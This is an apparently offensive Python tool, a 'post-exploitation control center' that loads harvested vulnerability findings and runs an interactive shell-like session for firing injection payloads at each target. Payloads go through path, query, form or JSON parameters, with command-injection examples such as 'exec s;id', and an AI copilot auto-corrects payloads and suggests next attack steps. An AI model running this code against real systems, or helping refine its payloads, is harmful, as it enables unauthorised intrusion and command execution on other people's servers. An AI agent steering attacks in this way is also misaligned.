import os
import sys
import json
import urllib.request
import urllib.parse
import urllib.error
import re

# Import the core Terminal Agent copilot
try:
    from core.agent import TerminalAgent
except ImportError:
    TerminalAgent = None

RESULTS_FILE = "scan_results.json"

def load_findings():
    if not os.path.exists(RESULTS_FILE):
        return []
    try:
        with open(RESULTS_FILE, "r") as f:
            return json.load(f)
    except Exception:
        return []

def send_request(url, method="GET", data=None, headers=None):
    headers = headers or {'User-Agent': 'Mozilla/5.0'}
    try:
        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.getcode(), resp.read().decode('utf-8', errors='ignore')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', errors='ignore')
    except Exception as ex:
        return None, str(ex)

def interactive_session(item):
    target = item.get("target")
    vulnerability = item.get("vulnerability")
    param = item.get("param", "query")
    method = item.get("method", "GET")
    fmt = item.get("format", "query")
    token = item.get("token", "N/A")
    
    # Initialize the Terminal Agent Copilot if available
    agent = TerminalAgent() if TerminalAgent else None
    
    os.system('clear' if os.name == 'posix' else 'cls')
    print("=" * 65)
    print(f" [*] INTERACTIVE SESSION [{vulnerability.upper()}]")
    print(f" [*] Target: {target}")
    print(f" [*] Method: {method} | Format: {fmt} | Parameter/Placeholder: {param}")
    if agent:
        print(f" [*] Copilot Status: Active ({agent.name})")
    print("=" * 65)
    print(" Type 'help' for available commands, or 'exit' to return to dashboard.\n")
    
    while True:
        try:
            cmd_line = input("(target session)> ").strip()
        except (KeyboardInterrupt, EOFError):
            print()
            break
            
        if not cmd_line:
            continue
            
        parts = cmd_line.split(" ", 1)
        action = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else ""
        
        if action == "exit":
            break
        elif action == "help":
            print("    Commands:")
            print("      info        - View current target and vulnerability details")
            print("      exploit     - Re-run automated exploit payload against target")
            print(f"      exec <val>  - Dispatch payload (Method: {method}, Format: {fmt})")
            print("      curl <url>  - Send a custom test request to any URL")
            print("      exit        - Return to dashboard")
        elif action == "info":
            print(f"    Target URL    : {target}")
            print(f"    Vector Type   : {vulnerability}")
            print(f"    Method        : {method}")
            print(f"    Format        : {fmt}")
            print(f"    Parameter     : {param}")
            print(f"    Token         : {token}")
        elif action == "exploit" or action == "exec":
            if action == "exec" and not arg:
                print("    [-] Error: No argument provided for exec (e.g. 'exec s;id')")
                continue
            payload_val = arg if action == "exec" else "test_payload"
                
            headers = {'User-Agent': 'Mozilla/5.0'}
            if token != "N/A":
                headers['X-Auth-Token'] = token

            # Handle Path-parameter substitution with safe characters for injection
            if fmt == "path" or "{" in target:
                exploit_url = re.sub(r'\{[^}]+\}', urllib.parse.quote(payload_val, safe=';& /'), target)
                print(f"[*] Dispatching PATH payload to: {exploit_url}")
                code, body = send_request(exploit_url, method=method, headers=headers)
                
            elif method.upper() == "GET":
                parsed_url = urllib.parse.urlparse(target)
                query_params = urllib.parse.parse_qs(parsed_url.query)
                query_params[param] = [payload_val]
                new_query = urllib.parse.urlencode(query_params, doseq=True)
                exploit_url = urllib.parse.urlunparse((
                    parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, new_query, parsed_url.fragment
                ))
                print(f"[*] Dispatching GET payload to: {exploit_url}")
                code, body = send_request(exploit_url, method="GET", headers=headers)
            else:
                if fmt == "json":
                    payload_data = json.dumps({param: payload_val}).encode('utf-8')
                    headers['Content-Type'] = 'application/json'
                else:
                    payload_data = urllib.parse.urlencode({param: payload_val}).encode('utf-8')
                    headers['Content-Type'] = 'application/x-www-form-urlencoded'
                
                print(f"[*] Dispatching POST payload to: {target}")
                code, body = send_request(target, method="POST", data=payload_data, headers=headers)
                
            print(f"    [+] Response (HTTP {code}):\n{body}\n")

            # Feed the full item context into the Terminal Agent for real-time analysis
            if agent:
                analysis = agent.analyze_response(item, payload_val, code, body)
                if analysis.get('suggestion'):
                    print(f"    [🤖 Agent Insight]: {analysis['suggestion']}")
                if analysis.get('corrected_payload'):
                    print(f"    [🤖 Auto-Corrected Payload]: {analysis['corrected_payload']}")
                for step in analysis.get('next_steps', []):
                    print(f"    [💡 Suggested Next Step]: {step}")
                print("-" * 50)

        elif action == "curl":
            if not arg:
                print("    [-] Usage: curl <full_url>")
                continue
            code, body = send_request(arg)
            print(f"    [+] Response (HTTP {code}):\n{body}\n")
        else:
            print(f"    [-] Unknown command '{action}'. Type 'help' for options.")

def main():
    findings = load_findings()
    if not findings:
        print("[-] No harvested assets found in scan_results.json. Run an autonomous scan first.")
        return

    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        print("=" * 65)
        print(" [*] ACCESS GAINED & POST-EXPLOITATION CONTROL CENTER")
        print("=" * 65)
        print(f" [+] Loaded {len(findings)} harvested vector(s).\n")
        print(" [Harvested Assets]")
        for idx, f in enumerate(findings, 1):
            print(f"  {idx}) [{f.get('vulnerability')}] {f.get('target')} (Method: {f.get('method', 'GET')} | Param: {f.get('param', 'N/A')})")
        print(f"  {len(findings) + 1}) Return to Main Menu")
        print("-" * 65)
        
        choice = input(f"Select action [1-{len(findings) + 1}]: ").strip()
        if not choice:
            continue
            
        if choice.isdigit():
            c_num = int(choice)
            if c_num == len(findings) + 1:
                break
            elif 1 <= c_num <= len(findings):
                interactive_session(findings[c_num - 1])
            else:
                print("[-] Invalid selection.")
        else:
            print("[-] Please enter a valid number.")

if __name__ == "__main__":
    main()
